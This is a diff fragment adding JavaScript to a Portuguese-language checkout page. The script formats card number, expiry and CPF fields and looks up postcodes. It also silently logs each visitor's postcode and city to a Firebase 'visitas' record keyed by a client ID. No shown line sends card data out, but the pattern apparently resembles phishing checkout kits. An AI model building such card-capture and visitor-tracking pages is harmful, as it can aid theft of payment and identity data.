+    function detectCardBrand() {
+      const bandeira = document.getElementById('bandeira');
+      const numero = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+      if (/^4/.test(numero)) {
+        bandeira.src = 'https://img.icons8.com/color/48/visa.png';
+        bandeira.style.display = 'block';
+      } else if (/^5[1-5]/.test(numero)) {
+        bandeira.src = 'https://img.icons8.com/color/48/mastercard-logo.png';
+        bandeira.style.display = 'block';
+      } else {
+        bandeira.style.display = 'none';
+      }
+    }
+
+    function formatCardNumber() {
+      let n = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+      n = n.replace(/(.{4})/g, '$1 ').trim();
+      document.getElementById('numeroCartao').value = n;
+    }
+    function formatValidade() {
+      let v = document.getElementById('validade').value.replace(/\D/g, '');
+      if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);
+      document.getElementById('validade').value = v;
+    }
+    function formatCpfCartao() {
+      let c = document.getElementById('cpfCartao').value.replace(/\D/g, '');
+      c = c.replace(/(\d{3})(\d)/, '$1.$2');
+      c = c.replace(/(\d{3})(\d)/, '$1.$2');
+      c = c.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      document.getElementById('cpfCartao').value = c;
+    }
+
+    /* ============ CEP NO TOPO (sem mensagens de erro) ============ */
+    function formatarCepTopo(input) {
+      let v = input.value.replace(/\D/g, '');
+      if (v.length > 8) v = v.slice(0, 8);
+      v = v.replace(/(\d{5})(\d)/, '$1-$2');
+      input.value = v;
+    }
+
+    function abrirModalCep() {
+      document.getElementById('modalCep').style.display = 'flex';
+      document.getElementById('cepTopo').focus();
+      document.getElementById('cepTopoStatus').textContent = '';
+      document.getElementById('cepTopoResultado').style.display = 'none';
+    }
+
+    function fecharModalCep() {
+      document.getElementById('modalCep').style.display = 'none';
+    }
+
+    function confirmarCepTopo() {
+      const input = document.getElementById('cepTopo');
+      const status = document.getElementById('cepTopoStatus');
+      const resultado = document.getElementById('cepTopoResultado');
+      const cep = input.value.replace(/\D/g, '');
+
+      if (cep.length !== 8) return;
+
+      status.textContent = 'Buscando...';
+      status.style.color = '#666';
+
+      fetch(`https://viacep.com.br/ws/${cep}/json/`)
+        .then(r => r.json())
+        .then(data => {
+          if (data.erro) {
+            status.textContent = '';
+            resultado.style.display = 'none';
+            return;
+          }
+
+          status.textContent = '✅ CEP encontrado!';
+          status.style.color = '#00a650';
+          resultado.style.display = 'block';
+          resultado.innerHTML = `
+            <div><strong>${data.logradouro || ''}</strong></div>
+            <div>${data.bairro || ''}</div>
+            <div>${data.localidade || ''}/${data.uf || ''}</div>
+          `;
+
+          const texto = `📍 ${data.localidade || ''} ${data.uf || ''} · ${input.value}`;
+          document.getElementById('btnCepTopo').textContent = texto;
+
+          localStorage.setItem('cepTopo', input.value);
+          localStorage.setItem('cidadeTopo', `${data.localidade || ''}/${data.uf || ''}`);
+          const clienteIdAtual = localStorage.getItem('clienteId');
+          if (clienteIdAtual) {
+            db.ref('visitas/' + clienteIdAtual).update({
+              cepTopo: input.value,
+              cidadeTopo: data.localidade || '',
+              ufTopo: data.uf || '',
+              cepAtualizadoEm: Date.now()
+            });
+          }
+
+          setTimeout(() => { fecharModalCep(); }, 1200);
+        })
+        .catch(() => { status.textContent = ''; });
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const cepSalvo = localStorage.getItem('cepTopo');
+      const cidadeSalva = localStorage.getItem('cidadeTopo');
+      if (cepSalvo && cidadeSalva) {
+        document.getElementById('btnCepTopo').textContent = `📍 ${cidadeSalva} · ${cepSalvo}`;
+      }
+    });
+  </script>
+</body>
+</html>
